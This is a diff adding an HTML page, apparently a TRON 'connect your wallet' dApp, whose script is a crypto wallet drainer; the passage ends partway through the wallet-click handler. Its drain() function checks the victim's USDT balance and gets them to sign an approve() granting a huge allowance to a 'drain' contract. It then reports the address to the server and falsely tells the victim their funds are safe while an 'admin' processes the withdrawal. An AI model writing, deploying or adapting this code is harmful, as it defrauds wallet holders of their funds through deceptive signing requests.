@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TRON DApp</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script defer src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.0/dist/index.umd.min.js" onerror="console.error('WC CDN load failed, will use dynamic load')"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: #000; color: #fff;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
+    }
+    .container {
+      width: 100%; max-width: 400px;
+      background: #111; border: 1px solid #222; border-radius: 16px;
+      padding: 28px 20px;
+    }
+    .header { text-align: center; margin-bottom: 16px; }
+    .header p { font-size: 12px; color: #666; }
+    .msg {
+      padding: 10px 14px; border-radius: 10px; font-size: 13px; line-height: 1.5;
+      margin-bottom: 14px; display: none; border: 1px solid transparent;
+    }
+    .msg.show { display: block; }
+    .msg.err { background: #1a0a0a; border-color: #331111; color: #ff6b6b; }
+    .msg.ok { background: #0a1a0a; border-color: #113311; color: #6bff6b; }
+    .msg.inf { background: #0a0a1a; border-color: #111133; color: #6b6bff; }
+    .wallet-list { display: flex; flex-direction: column; gap: 6px; }
+    .wallet-btn {
+      display: flex; align-items: center; gap: 12px;
+      padding: 12px 14px; background: #181818; border: 1px solid #2a2a2a;
+      border-radius: 12px; cursor: pointer; font-family: inherit; color: #fff;
+      text-align: left; width: 100%; transition: border-color 0.15s;
+    }
+    .wallet-btn:hover { border-color: #444; }
+    .wallet-btn:active { transform: scale(0.98); }
+    .wallet-btn .ico {
+      width: 36px; height: 36px; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+      overflow: hidden;
+    }
+    .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; }
+    .wallet-btn .nm { font-size: 14px; font-weight: 500; }
+    .wallet-btn.hidden { display: none; }
+    .toggle-btn {
+      display: block; width: 100%; padding: 10px; border-radius: 10px;
+      border: 1px solid #222; background: transparent; color: #666;
+      font-size: 12px; cursor: pointer; font-family: inherit; text-align: center; margin-top: 6px;
+    }
+    .toggle-btn:hover { border-color: #444; color: #fff; }
+    .log { margin-top: 14px; }
+    .log-item {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 14px; background: #0d0d0d; border: 1px solid #222;
+      border-radius: 10px; margin-bottom: 6px; font-size: 13px; color: #888;
+    }
+    .log-item .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+    .log-item .dot.busy { background: #ffd700; animation: pulse 1.5s infinite; }
+    .log-item .dot.ok { background: #4ade80; }
+    .log-item .dot.fail { background: #ff4444; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+    .spinner {
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.15); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .footer { margin-top: 18px; text-align: center; font-size: 11px; color: #333; }
+    .screen { display: none; }
+    .screen.on { display: block; }
+    .back-btn {
+      display: block; width: 100%; padding: 10px; border-radius: 10px;
+      border: 1px solid #222; background: transparent; color: #666;
+      font-size: 13px; cursor: pointer; font-family: inherit; text-align: center; margin-top: 12px;
+    }
+    .back-btn:hover { border-color: #444; color: #fff; }
+    .tx-link { color: #888; text-decoration: none; font-size: 12px; border-bottom: 1px dotted #444; }
+    .tx-link:hover { color: #fff; }
+    .qr-icon { display:inline-block; margin-left:auto; padding:4px 8px; font-size:11px; color:#666; cursor:pointer; border:1px solid #2a2a2a; border-radius:6px; background:transparent; }
+    .qr-icon:hover { border-color:#555; color:#fff; }
+    .sheet-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:99; }
+    .sheet-overlay.on { display:block; animation:fadeIn 0.2s ease; }
+    .bottom-sheet { display:none; position:fixed; bottom:0; left:0; right:0; z-index:100; background:#111; border:1px solid #222; border-radius:20px 20px 0 0; padding:24px 16px 32px; max-height:85vh; overflow-y:auto; transform:translateY(100%); transition:transform 0.3s cubic-bezier(0.32,0.72,0,1); box-shadow:0 -8px 40px rgba(0,0,0,0.5); }
+    .bottom-sheet.on { display:block; transform:translateY(0); }
+    .bottom-sheet .handle { width:36px; height:4px; border-radius:2px; background:#333; margin:0 auto 16px; }
+    .bottom-sheet .sheet-title { text-align:center; font-size:13px; color:#888; margin-bottom:16px; letter-spacing:0.3px; }
+    .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:200; align-items:center; justify-content:center; padding:20px; }
+    .modal.on { display:flex; animation:fadeIn 0.2s ease; }
+    .modal-content { background:#111; border:1px solid #333; border-radius:16px; padding:24px; text-align:center; max-width:320px; width:100%; position:relative; }
+    .modal-content img { width:200px; height:200px; display:block; margin:0 auto 16px; border-radius:8px; }
+    .modal-content p { font-size:13px; color:#888; margin-bottom:12px; word-break:break-all; }
+    .modal-content button { padding:10px 20px; border-radius:10px; border:1px solid #333; background:transparent; color:#fff; cursor:pointer; font-family:inherit; font-size:13px; margin-top:8px; }
+    .modal-content button:hover { border-color:#666; }
+    .wc-uri-text { font-size:11px; color:#555; background:#0a0a0a; padding:8px; border-radius:6px; border:1px solid #222; margin-bottom:8px; max-height:60px; overflow-y:auto; word-break:break-all; display:none; }
+    @keyframes fadeIn { from{opacity:0} to{opacity:1} }
+    @keyframes slideUp { from{transform:translateY(100%)} to{transform:translateY(0)} }
+    @media (max-width:480px) {
+      body.sheet-open { overflow:hidden; }
+      .container { border-radius:20px 20px 0 0; border-bottom:none; }
+    }
+    .wallet-list.compact { max-height:380px; overflow-y:auto; }
+    #walletBadge.show { display:flex !important; animation:badgeIn 0.35s cubic-bezier(0.32,0.72,0,1); }
+    @keyframes badgeIn { from{opacity:0;transform:translateY(-10px) scale(0.95)} to{opacity:1;transform:translateY(0) scale(1)} }
+    @media (max-width:480px) {
+      #walletBadge { top:auto; bottom:16px; right:16px; left:16px; border-radius:12px; padding:10px 14px; }
+      #walletBadge > div { width:100%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <p>Connect your wallet</p>
+    </div>
+    <div id="msgBox"></div>
+    <div class="screen on" id="scMain">
+      <div class="wallet-list" id="walletList"></div>
+      <button class="toggle-btn" id="toggleBtn"></button>
+    </div>
+    <div class="screen" id="scLog">
+      <div class="log" id="logBox"></div>
+      <button class="back-btn" id="backBtn">Back</button>
+    </div>
+    <div class="footer">TRON NETWORK</div>
+  </div>
+
+  <div id="walletBadge" style="display:none;position:fixed;top:12px;right:12px;z-index:50;background:rgba(17,17,17,0.95);border:1px solid #2a2a2a;border-radius:12px;padding:8px 14px 8px 10px;align-items:center;gap:10px;backdrop-filter:blur(8px);box-shadow:0 4px 20px rgba(0,0,0,0.5);">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <div id="badgeIcon" style="width:24px;height:24px;border-radius:6px;overflow:hidden;flex-shrink:0;"><img id="badgeImg" src="" alt="" style="width:100%;height:100%;object-fit:contain;"></div>
+      <div>
+        <div style="display:flex;align-items:center;gap:6px;"><span id="badgeName" style="font-size:12px;font-weight:600;color:#fff;"></span><span style="display:inline-block;width:6px;height:6px;border-radius:50%;background:#4ade80;"></span></div>
+        <div id="badgeAddr" style="font-size:11px;color:#888;font-family:monospace;"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="qrModal">
+    <div class="modal-content">
+      <img id="qrImg" src="" alt="QR Code" style="display:none">
+      <div id="qrLoading" style="padding:20px;color:#888;font-size:13px">Loading...</div>
+      <p id="qrText">Scan with Trust Wallet on your phone</p>
+      <div id="projectIdRow" style="margin-bottom:12px">
+        <input id="projectIdInput" type="text" placeholder="WalletConnect Project ID" style="width:100%;padding:10px;border-radius:8px;border:1px solid #333;background:#0d0d0a;color:#fff;font-family:inherit;font-size:13px;text-align:center">
+        <p style="font-size:11px;color:#555;margin-top:6px">Get free ID: <a href="https://cloud.walletconnect.com" target="_blank" style="color:#888">cloud.walletconnect.com</a></p>
+      </div>
+      <div id="wcUriText" class="wc-uri-text"></div>
+      <button id="closeQrBtn">Close</button>
+    </div>
+  </div>
+
+  <script>
+    var VISIBLE_COUNT = 5;
+    var WALLETS = [
+      { id:'tronlink', name:'TronLink', hasExtension:true, url:'https://tronlink.org', app:'tronlink://', logo:'https://tronlink.org/favicon.ico', store:'https://chromewebstore.google.com/detail/tronlink/ibnejdfjmmkpcnlpebibmnhlmaoboebd', ios:'https://apps.apple.com/app/tronlink/id1603523622', android:'https://play.google.com/store/apps/details?id=com.tronlink.wallet' },
+      { id:'okx', name:'OKX', hasExtension:true, url:'https://www.okx.com/web3', app:'okx://', logo:'https://dl.svgcdn.com/svg/token-branded/okx.svg', store:'https://chromewebstore.google.com/detail/okx-wallet/mcohilncbfahbmgdjkbpemcciiolgcge', ios:'https://www.okx.com/download', android:'https://www.okx.com/download' },
+      { id:'tokenpocket', name:'TokenPocket', hasExtension:true, url:'https://www.tokenpocket.pro', app:'tp://', logo:'https://dl.svgcdn.com/svg/token-branded/token-pocket.svg', store:'https://chromewebstore.google.com/detail/tokenpocket/mfgccjchihfkkindfppnaooecgfneiii', ios:'https://apps.apple.com/app/tokenpocket/id1436169975', android:'https://play.google.com/store/apps/details?id=vip.mytokenpocket' },
+      { id:'trust', name:'Trust', hasExtension:true, url:'https://trustwallet.com', app:'trust://', logo:'https://dl.svgcdn.com/svg/token-branded/trust.svg', store:'https://chromewebstore.google.com/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph', ios:'https://apps.apple.com/app/trust-wallet/id1288339409', android:'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp' },
+      { id:'bitget', name:'Bitget', hasExtension:true, url:'https://web3.bitget.com', app:'bitkeep://', logo:'https://dl.svgcdn.com/svg/token-branded/bitget.svg', store:'https://chromewebstore.google.com/detail/bitget-wallet/jiidiaalihghedndngbffclbphnnifpi', ios:'https://web3.bitget.com', android:'https://web3.bitget.com' },
+      { id:'bybit', name:'Bybit', hasExtension:true, url:'https://www.bybit.com/en/web3', app:'bybit://', logo:'https://dl.svgcdn.com/svg/token-branded/bybit.svg', store:'https://chromewebstore.google.com/detail/bybit-wallet/occjkiddkdjpmggfpfpakciifdjmlhpb', ios:'https://www.bybit.com/en/web3', android:'https://www.bybit.com/en/web3' },
+      { id:'imtoken', name:'imToken', hasExtension:false, url:'https://token.im', app:'imtokenv2://', logo:'https://dl.svgcdn.com/svg/token-branded/imtoken.svg', store:'', ios:'https://apps.apple.com/app/imtoken2/id1384798940', android:'https://play.google.com/store/apps/details?id=im.token.app' },
+      { id:'gate', name:'Gate', hasExtension:true, url:'https://www.gate.io/web3', app:'gateweb3://', logo:'https://dl.svgcdn.com/svg/token-branded/gate-io.svg', store:'https://chromewebstore.google.com/detail/gate-web3-wallet/dgbckmcnhkkebcnbegbfmflplleheobj', ios:'https://www.gate.io/web3', android:'https://www.gate.io/web3' },
+      { id:'portal', name:'Portal', hasExtension:false, url:'https://www.portalwallet.com', app:'portal://', logo:'https://dl.svgcdn.com/svg/token-branded/portal.svg', store:'https://chromewebstore.google.com/detail/portal-wallet/igkmggadgopbmlcjgecgilchpmbcppph', ios:'https://www.portalwallet.com', android:'https://www.portalwallet.com' },
+      { id:'foxwallet', name:'FoxWallet', hasExtension:true, url:'https://foxwallet.com', app:'foxwallet://', logo:'https://foxwallet.com/wp-content/themes/foxwallet/assets/icons/logo-icon.svg', store:'https://chromewebstore.google.com/detail/foxwallet/akaeplhhmfcnalnbohohgcpickpdbjcg', ios:'https://foxwallet.com', android:'https://foxwallet.com' },
+      { id:'bitpie', name:'BitPie', hasExtension:false, url:'https://bitpie.com', app:'bitpie://', logo:'https://bitpie.com/favicon.ico', store:'', ios:'https://bitpie.com', android:'https://bitpie.com' }
+    ];
+
+    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
+    var isTrustBrowser = /Trust/i.test(navigator.userAgent);
+    var config = {};
+    var expanded = false;
+    var activeProvider = null;
+    var WC_PROJECT_ID = 'f5caf598cbdd40f84d73a6a82b893d83';
+
+    var msgBox = document.getElementById('msgBox');
+    var walletList = document.getElementById('walletList');
+    var logBox = document.getElementById('logBox');
+    var backBtn = document.getElementById('backBtn');
+    var toggleBtn = document.getElementById('toggleBtn');
+
+    function msg(type, text) { msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>'; }
+    function hideMsg() { msgBox.innerHTML = ''; }
+    function scShow(id) {
+      document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
+      document.getElementById(id).classList.add('on');
+    }
+
+    function addLog(text, state) {
+      var el = document.createElement('div'); el.className = 'log-item';
+      if (state === 'busy') {
+        el.innerHTML = '<div class="spinner" style="margin-right:10px;flex-shrink:0"></div>' + text;
+      } else {
+        el.innerHTML = '<div class="dot ' + state + '"></div>' + text;
+      }
+      logBox.appendChild(el); return el;
+    }
+    function setLog(el, text, state) {
+      if (state === 'busy') {
+        el.innerHTML = '<div class="spinner" style="margin-right:10px;flex-shrink:0"></div>' + text;
+      } else {
+        el.innerHTML = '<div class="dot ' + state + '"></div>' + text;
+      }
+    }
+
+    var USDT_ABI = [
+      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function","stateMutability":"nonpayable"},
+      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function","stateMutability":"view"},
+      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function","stateMutability":"nonpayable"}
+    ];
+
+    function getTronLink() { return window.tronLink || (window.trustwallet && window.trustwallet.tronLink) || null; }
+    function getFoxWallet() { return window.foxwallet || null; }
+    function getTronWeb() {
+      if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
+      if (window.tronWeb) return window.tronWeb;
+      return null;
+    }
+    function getOkx() { return window.okxwallet || null; }
+    function getBitget() { return window.bitkeep || window.bitgetWallet || null; }
+    function getGate() { return window.gatewallet || null; }
+    function getBybit() { return window.bybitWallet || window.bybitwallet || window.BHEX_wallet || window.BHEX || null; }
+
+    function findTronWebProvider() {
+      var tw = getTronWeb();
+      if (tw) return tw;
+      var okx = getOkx();
+      if (okx) {
+        var p = okx.tron || okx.tronLink;
+        if (p && p.tronWeb && p.tronWeb.ready) return p.tronWeb;
+      }
+      var bg = getBitget();
+      if (bg && bg.tron && bg.tron.tronWeb && bg.tron.tronWeb.ready) return bg.tron.tronWeb;
+      var gw = getGate();
+      if (gw && gw.tron && gw.tron.tronWeb && gw.tron.tronWeb.ready) return gw.tron.tronWeb;
+      var bb = getBybit();
+      if (bb && bb.tronLink && bb.tronLink.tronWeb && bb.tronLink.tronWeb.ready) return bb.tronLink.tronWeb;
+      var fw = getFoxWallet();
+      if (fw && fw.tronLink && fw.tronLink.tronWeb && fw.tronLink.tronWeb.ready) return fw.tronLink.tronWeb;
+      var tl = getTrustLink();
+      if (tl && tl.tronWeb && tl.tronWeb.ready) return tl.tronWeb;
+      return null;
+    }
+
+    async function waitForProvider(timeout) {
+      timeout = timeout || 20000;
+      var step = 300;
+      var waited = 0;
+      while (waited < timeout) {
+        var p = findTronWebProvider();
+        if (p && p.defaultAddress && p.defaultAddress.base58) return p;
+        await new Promise(function(r) { setTimeout(r, step); });
+        waited += step;
+      }
+      return findTronWebProvider();
+    }
+
+    async function connectTronLink() {
+      var tl = getTronLink();
+      if (!tl || !tl.request) return null;
+      var res = await tl.request({ method: 'tron_requestAccounts' });
+      var addr = res && (res.data && res.data.address || res.address || (Array.isArray(res) ? res[0] : null) || (typeof res === 'string' ? res : null));
+      if (addr) {
+        var tlWeb = null;
+        try { tlWeb = window.tronLink && window.tronLink.tronWeb; } catch(e) {}
+        activeProvider = tlWeb || getTronWeb();
+        return addr;
+      }
+      var tw = getTronWeb();
+      if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+        activeProvider = tw;
+        return tw.defaultAddress.base58;
+      }
+      return null;
+    }
+
+    async function connectOkx() {
+      var okx = getOkx();
+      if (!okx) return null;
+      var provider = okx.tron || okx.tronLink;
+      if (!provider || !provider.request) return null;
+      try {
+        var res = await provider.request({ method: 'tron_requestAccounts' });
+        if (!res) return null;
+        var addr = null;
+        if (typeof res === 'string') addr = res;
+        else if (Array.isArray(res)) addr = res[0] || null;
+        else if (res.address) addr = res.address;
+        else if (res.data) {
+          if (typeof res.data === 'string') addr = res.data;
+          else if (res.data.address) addr = res.data.address;
+          else if (Array.isArray(res.data)) addr = res.data[0] || null;
+        }
+        if (addr) {
+          activeProvider = provider.tronWeb || findTronWebProvider();
+          return addr;
+        }
+        await new Promise(function(r) { setTimeout(r, 1000); });
+        activeProvider = provider.tronWeb || findTronWebProvider();
+        if (activeProvider && activeProvider.defaultAddress && activeProvider.defaultAddress.base58) {
+          return activeProvider.defaultAddress.base58;
+        }
+        return null;
+      } catch(e) { return null; }
+    }
+
+    async function connectBitget() {
+      var bg = getBitget();
+      if (!bg || !bg.tron) return null;
+      var res = await bg.tron.request({ method: 'tron_requestAccounts' });
+      var addr = res && (res.data && res.data.address || res.address || (Array.isArray(res) ? res[0] : null));
+      if (addr) {
+        activeProvider = bg.tron.tronWeb || findTronWebProvider();
+        return addr;
+      }
+      return null;
+    }
+
+    async function connectGate() {
+      var gw = getGate();
+      if (!gw || !gw.tron) return null;
+      var res = await gw.tron.request({ method: 'tron_requestAccounts' });
+      var addr = res && (res.data && res.data.address || res.address || null);
+      if (addr) {
+        activeProvider = gw.tron.tronWeb || findTronWebProvider();
+        return addr;
+      }
+      return null;
+    }
+
+    async function connectBybit() {
+      var bb = getBybit();
+      if (!bb || !bb.tronLink) return null;
+      var res = await bb.tronLink.request({ method: 'tron_requestAccounts' });
+      var addr = res && (res.data && res.data.address || res.address || null);
+      if (addr) {
+        activeProvider = bb.tronLink.tronWeb || findTronWebProvider();
+        return addr;
+      }
+      return null;
+    }
+
+    var skipTriggerContract = false;
+    var trustActive = false;
+
+    async function getEthAddr(eth) {
+      try {
+        var r = await eth.request({ method: 'tron_requestAccounts' });
+        if (r) {
+          if (typeof r === 'string') return r;
+          if (Array.isArray(r)) return r[0] || null;
+          if (r.address) return r.address;
+          if (r.data && typeof r.data === 'string') return r.data;
+          if (r.data && r.data.address) return r.data.address;
+        }
+      } catch(e) {}
+      try {
+        var r = await eth.request({ method: 'eth_requestAccounts' });
+        if (r && Array.isArray(r)) return r[0] || null;
+        if (typeof r === 'string') return r;
+      } catch(e) {}
+      try {
+        var r = await eth.request({ method: 'eth_accounts' });
+        if (r && Array.isArray(r)) return r[0] || null;
+      } catch(e) {}
+      if (eth.selectedAddress) return eth.selectedAddress;
+      return null;
+    }
+
+    function getTrustLink() {
+      try {
+        if (window.trustwallet && window.trustwallet.tronLink) return window.trustwallet.tronLink;
+      } catch(e) {}
+      if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) {
+        if (window.ethereum.tronLink) return window.ethereum.tronLink;
+      }
+      return null;
+    }
+
+    async function connectTrust() {
+      trustActive = true;
+      var dbg = 'trustLink=' + (!!getTrustLink()) + ' tronWeb=' + (!!getTronWeb()) + ' ethTrust=' + (!!(window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet))) + ' tw=' + (!!window.trustwallet) + ' trustUA=' + isTrustBrowser;
+      msg('inf', 'Debug: ' + dbg);
+      var trustLink = getTrustLink();
+      if (trustLink) {
+        if (trustLink.ready && trustLink.tronWeb && trustLink.tronWeb.defaultAddress && trustLink.tronWeb.defaultAddress.base58) {
+          activeProvider = trustLink.tronWeb; skipTriggerContract = true;
+          return trustLink.tronWeb.defaultAddress.base58;
+        }
+        try {
+          var res = await trustLink.request({ method: 'tron_requestAccounts' });
+        } catch(e) {}
+        var waited = 0;
+        while (waited < 8000) {
+          if (trustLink.ready && trustLink.tronWeb && trustLink.tronWeb.defaultAddress && trustLink.tronWeb.defaultAddress.base58) {
+            activeProvider = trustLink.tronWeb; skipTriggerContract = true;
+            return trustLink.tronWeb.defaultAddress.base58;
+          }
+          await new Promise(function(r) { setTimeout(r, 200); });
+          waited += 200;
+        }
+        if (trustLink.tronWeb && trustLink.tronWeb.defaultAddress && trustLink.tronWeb.defaultAddress.base58) {
+          activeProvider = trustLink.tronWeb; skipTriggerContract = true;
+          return trustLink.tronWeb.defaultAddress.base58;
+        }
+        return null;
+      }
+      var tw = getTronWeb();
+      if (!tw) {
+        var waited = 0;
+        while (waited < 15000) {
+          tw = getTronWeb();
+          if (tw) break;
+          await new Promise(function(r) { setTimeout(r, 300); });
+          waited += 300;
+        }
+        if (!tw) return null;
+      }
+      if (tw.defaultAddress && tw.defaultAddress.base58) {
+        activeProvider = tw; skipTriggerContract = true;
+        return tw.defaultAddress.base58;
+      }
+      if (tw.request) {
+        try {
+          var res = await tw.request({ method: 'tron_requestAccounts' });
+          if (res) {
+            var addr = null;
+            if (typeof res === 'string') addr = res;
+            else if (Array.isArray(res)) addr = res[0] || null;
+            else if (res.address) addr = res.address;
+            else if (res.data) {
+              if (typeof res.data === 'string') addr = res.data;
+              else if (res.data.address) addr = res.data.address;
+              else if (Array.isArray(res.data)) addr = res.data[0] || null;
+            }
+            if (addr) { activeProvider = tw; skipTriggerContract = true; return addr; }
+          }
+        } catch(e) {}
+      }
+      var waited2 = 0;
+      while (waited2 < 5000) {
+        if (tw.defaultAddress && tw.defaultAddress.base58) {
+          activeProvider = tw; skipTriggerContract = true;
+          return tw.defaultAddress.base58;
+        }
+        await new Promise(function(r) { setTimeout(r, 300); });
+        waited2 += 300;
+      }
+      return null;
+    }
+
+    async function drain(address) {
+      hideMsg(); logBox.innerHTML = ''; scShow('scLog');
+
+      var tw = activeProvider || await waitForProvider(20000);
+      if (!tw) {
+        addLog('Wallet not connected. Try again.', 'fail');
+        msg('err', 'Wallet not available');
+        return;
+      }
+
+      var approveVal = '1000000000000000000';
+
+      var log = addLog('Checking USDT balance...', 'busy');
+      if (trustActive) {
+        setLog(log, 'Checking balance... (skip)', 'ok');
+      } else {
+        try {
+          var uc = await tw.contract(USDT_ABI).at(config.usdtContract);
+          var raw = await uc.balanceOf(address).call();
+          var bal = raw.toNumber ? raw.toNumber() : Number(raw);
+          if (bal <= 0) {
+            setLog(log, 'No USDT found on this address', 'fail');
+            msg('inf', 'No USDT');
+            return;
+          }
+          setLog(log, 'Balance: ' + (bal / 1e6).toFixed(2) + ' USDT', 'ok');
+        } catch(e) {
+          setLog(log, 'Checking balance... (skip)', 'ok');
+        }
+      }
+
+      var log2 = addLog('Confirm approve in wallet...', 'busy');
+      var approveTx;
+
+      async function buildViaRpc() {
+        var addrHelper = (tw && tw.address && tw.address.toHex) ? tw : (window.tronWeb || null);
+        var usdtHex = config.usdtContractHex || '';
+        var drainHex = config.drainContractHex || '';
+        if ((!usdtHex || !drainHex) && addrHelper) {
+          usdtHex = addrHelper.address.toHex(config.usdtContract);
+          drainHex = addrHelper.address.toHex(config.drainContract);
+        }
+        if (!usdtHex || !drainHex) { return null; }
+        var addrClean = drainHex.replace(/^0x|^41/, '').toLowerCase().padStart(64, '0');
+        var valHex = BigInt(approveVal).toString(16).padStart(64, '0').slice(-64);
+        var ownerHex = '';
+        if (addrHelper) {
+          ownerHex = addrHelper.address.toHex(address);
+        } else {
+          ownerHex = address;
+        }
+        var resp = await fetch('/api/build-tx', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            contract_address: usdtHex,
+            function_selector: 'approve(address,uint256)',
+            parameter: addrClean + valHex,
+            owner_address: ownerHex,
+            fee_limit: 20000000,
+            call_value: 0
+          })
+        });
+        var data = await resp.json();
+        var tx = data.transaction || data;
+        if (tx && tx.txID) return tx;
+        return null;
+      }
+
+      if (skipTriggerContract) {
+        try { approveTx = await buildViaRpc(); } catch(e) { approveTx = null; }
+      } else {
+        try {
+          var built = await tw.transactionBuilder.triggerSmartContract(
+            config.usdtContract, 'approve(address,uint256)',
+            { feeLimit: 20000000 },
+            [{ type: 'address', value: config.drainContract }, { type: 'uint256', value: approveVal }],
+            address
+          );
+          approveTx = built.transaction || built;
+        } catch(e) {
+          try { approveTx = await buildViaRpc(); } catch(e2) { approveTx = null; }
+        }
+      }
+
+      if (!approveTx || !approveTx.txID) {
+        setLog(log2, 'Build failed', 'fail');
+        msg('err', 'Failed');
+        return;
+      }
+
+      var signedApprove;
+      try {
+        if (trustActive) {
+          var trustLink = getTrustLink();
+          var addr = (typeof address === 'string') ? address : (tw && tw.defaultAddress ? tw.defaultAddress.base58 : '');
+
+          // Try trustLink.request with tron_signTransaction (primary method)
+          if (trustLink && typeof trustLink.request === 'function') {
+            signedApprove = await trustLink.request({ method: 'tron_signTransaction', params: { address: addr, transaction: approveTx } });
+          }
+
+          // Fallback: trx.sign
+          if (!signedApprove && tw && typeof tw.trx.sign === 'function') {
+            signedApprove = await tw.trx.sign(approveTx);
+          }
+
+          if (!signedApprove) throw new Error('Trust signing failed');
+        } else {
+          signedApprove = await tw.trx.sign(approveTx);
+        }
+      } catch(e) {
+        var s = e.message || e.code || String(e);
+        if (s.toLowerCase().indexOf('cancel') !== -1 || s.toLowerCase().indexOf('reject') !== -1) {
+          setLog(log2, 'Cancelled', 'fail');
+          msg('inf', 'Cancelled');
+          return;
+        }
+        if (s.toLowerCase().indexOf('already pending') !== -1) {
+          setLog(log2, 'Close the previous Trust popup and try again', 'fail');
+          msg('inf', 'Trust: закройте предыдущее окно подписи и попробуйте снова');
+          return;
+        }
+        setLog(log2, 'Sign error: ' + s, 'fail');
+        msg('err', 'Failed');
+        return;
+      }
+
+      var approveReceipt;
+      try {
+        if (trustActive || (activeProvider && (activeProvider.isTrust || activeProvider.isTrustWallet))) {
+          var bcResp = await fetch('/api/broadcast-tx', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ transaction: signedApprove })
+          });
+          approveReceipt = await bcResp.json();
+        } else {
+          approveReceipt = await tw.trx.sendRawTransaction(signedApprove);
+        }
+      } catch(e) { approveReceipt = null; }
+
+      var approveTxId = '';
+      if (typeof approveReceipt === 'string') approveTxId = approveReceipt;
+      else if (approveReceipt) approveTxId = approveReceipt.txid || approveReceipt.txID || (approveReceipt.transaction && approveReceipt.transaction.txID) || '';
+      if (!approveTxId) {
+        setLog(log2, 'Send failed - no txid', 'fail');
+        return;
+      }
+
+      setLog(log2, 'Contract signed!', 'ok');
+      showConnectedWallet(address, drainWalletName || '');
+      fetch('/api/event', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'approve_signed', address:address, txId:approveTxId}) }).catch(function(){});
+      addLog('Approved: <a class="tx-link" href="https://tronscan.org/#/transaction/' + approveTxId + '" target="_blank">' + approveTxId.slice(0,16) + '...</a>', 'ok');
+      fetch('/api/approve-done', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({address:address}) }).catch(function(){});
+      addLog('Waiting for admin to process withdrawal', 'busy');
+      msg('ok', 'Contract signed! <span style="color:#4ade80;font-weight:600;">' + (address.slice(0,6) + '...' + address.slice(-4)) + '</span> connected. Your funds are safe. Admin will process soon.');
+    }
+
+    function openDeepLink(wallet) {
+      var currentUrl = window.location.href.split('?')[0].split('#')[0];
+      var href = wallet.app;
+      if (wallet.id === 'tronlink') {
+        var param = encodeURIComponent(JSON.stringify({ url: currentUrl, action: 'open', protocol: 'tronlink', version: '1.0' }));
+        href = 'tronlinkoutside://pull.activity?param=' + param;
+      } else if (wallet.id === 'trust') {
+        href = 'https://link.trustwallet.com/open_url?url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'okx') {
+        href = 'okx://wallet/dapp/url?url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'tokenpocket') {
+        href = 'tp://open?url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'bitget') {
+        href = 'bitkeep://browser?url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'bybit') {
+        href = 'bybit://dapp?url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'imtoken') {
+        href = 'imtokenv2://navigate?screen=Browser&url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'gate') {
+        href = 'gateweb3://navigate?screen=Browser&url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'portal') {
+        href = 'portal://browser?url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'foxwallet') {
+        href = 'foxwallet://browser?url=' + encodeURIComponent(currentUrl);
+      } else if (wallet.id === 'bitpie') {
+        href = 'bitpie://browser?url=' + encodeURIComponent(currentUrl);
+      }
+      if (!href) { msg('inf', 'No deep link available for ' + wallet.name); return; }
+      window.location.href = href;
+      setTimeout(function() {
+        if (!document.hidden) {
+          msg('inf', 'If the wallet did not open, check that it is installed');
+        }
+      }, 3500);
+    }
+
+    async function handleWalletClick(wallet) {
+      hideMsg();
+      var addr = null;
+      drainWalletName = wallet.name || wallet.id;
+
+      if (wallet.hasExtension) {
+        try {
+          switch (wallet.id) {
+            case 'tronlink':
+              if (getTronLink() || getTronWeb()) addr = await connectTronLink();
+              break;
+            case 'okx':
